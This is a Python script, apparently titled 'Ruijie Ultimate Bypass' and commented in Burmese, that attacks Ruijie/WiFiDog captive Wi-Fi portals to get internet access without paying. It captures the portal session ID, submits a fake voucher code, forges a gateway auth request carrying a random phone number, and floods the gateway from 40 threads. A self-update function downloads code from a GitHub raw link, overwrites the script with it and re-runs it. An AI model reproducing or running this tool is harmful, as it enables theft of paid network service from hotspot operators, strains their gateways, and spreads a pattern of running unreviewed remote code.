import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# GitHub Update Configuration
# ==========================================
# 1. သင့် GitHub Raw Link ကို ဒီနေရာမှာ အစားထိုးပါ
RAW_URL = "https://raw.githubusercontent.com/maunghlawin295810-max/win/refs/heads/main/l.py"
# 2. Version နံပါတ် (GitHub မှာ ကုဒ်ပြင်ရင် ဒါကိုပါ တိုးပေးရပါမယ်)
VERSION = "1.0.1" 

def check_update():
    """ GitHub မှ Version အသစ် ရှိမရှိ စစ်ဆေးပြီး Update လုပ်ပေးသော စနစ် """
    try:
        r = requests.get(RAW_URL, timeout=10)
        if r.status_code == 200:
            # GitHub ပေါ်က ကုဒ်ထဲမှာ VERSION = "1.0.2" စသဖြင့် ဖြစ်နေရင် Update လုပ်မယ်
            remote_v = re.search(r'VERSION\s*=\s*["\']([^"\']+)["\']', r.text)
            if remote_v and remote_v.group(1) != VERSION:
                print(f"\n\033[93m[!] Update Found: v{remote_v.group(1)} | Downloading...\033[0m")
                with open(__file__, 'w', encoding='utf-8') as f:
                    f.write(r.text)
                print("\033[92m[✓] Update Complete! Restarting Engine...\033[0m")
                os.execv(sys.executable, ['python'] + sys.argv)
    except:
        pass

# --- SETTINGS ---
THREADS = 40
CHECK_URL = "http://connectivitycheck.gstatic.com/generate_204"
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1'
}

def is_actually_online():
    try:
        r = requests.get("http://1.1.1.1", timeout=2, allow_redirects=False)
        return r.status_code in [200, 204, 301, 302]
    except:
        return False

def turbo_pulse(auth_url):
    s = requests.Session()
    while True:
        try:
            s.get(auth_url, headers=HEADERS, timeout=5, verify=False)
            print(f"\r\033[92m[⚡] PUMPING ACTIVE | DON'T STOP \033[0m", end="")
        except:
            break
        time.sleep(0.5)

def engine():
    print(f"\n\033[96m[ Ruijie Ultimate Bypass - Stable Version ]\033[0m")
    check_update() # Engine စတာနဲ့ Update အရင်စစ်မည်
    
    s = requests.Session()
    try:
        res = s.get(CHECK_URL, allow_redirects=True, timeout=5)
        portal_url = res.url
        
        if portal_url == CHECK_URL and is_actually_online():
            print("\033[92m[✓] Internet is working fine.\033[0m")
            time.sleep(10)
            return

        r_page = s.get(portal_url, headers=HEADERS, verify=False)
        q = parse_qs(urlparse(r_page.url).query)
        sid = q.get('sessionId', [None])[0] or re.search(r'sessionId=([a-zA-Z0-9\-]+)', r_page.text)
        if hasattr(sid, 'group'): sid = sid.group(1)

        if not sid:
            js_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r_page.text)
            if js_match:
                next_url = urljoin(portal_url, js_match.group(1))
                r_next = s.get(next_url, headers=HEADERS, verify=False)
                sid = parse_qs(urlparse(r_next.url).query).get('sessionId', [None])[0]

        if not sid:
            print("\033[91m[-] Error: SID hidden. Manual trigger needed.\033[0m")
            time.sleep(3)
            return

        print(f"\033[92m[✓] Captured SID: {sid}\033[0m")

        p_host = f"{urlparse(portal_url).scheme}://{urlparse(portal_url).netloc}"
        try:
            s.post(f"{p_host}/api/auth/voucher/", 
                   json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                   headers=HEADERS, timeout=5)
        except: pass

        gw_ip = q.get('gw_address', ['192.168.61.1'])[0]
        gw_port = q.get('gw_port', ['2060'])[0]
        auth_url = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}&phonenumber=09{random.randint(1000000,9999999)}"

        print(f"[*] Igniting Turbo Engine with {THREADS} threads...")
        for _ in range(THREADS):
            threading.Thread(target=turbo_pulse, args=(auth_url,), daemon=True).start()

        while True:
            time.sleep(5)
            if not is_actually_online(): break

    except Exception:
        time.sleep(3)

if __name__ == "__main__":
    while True:
        engine()
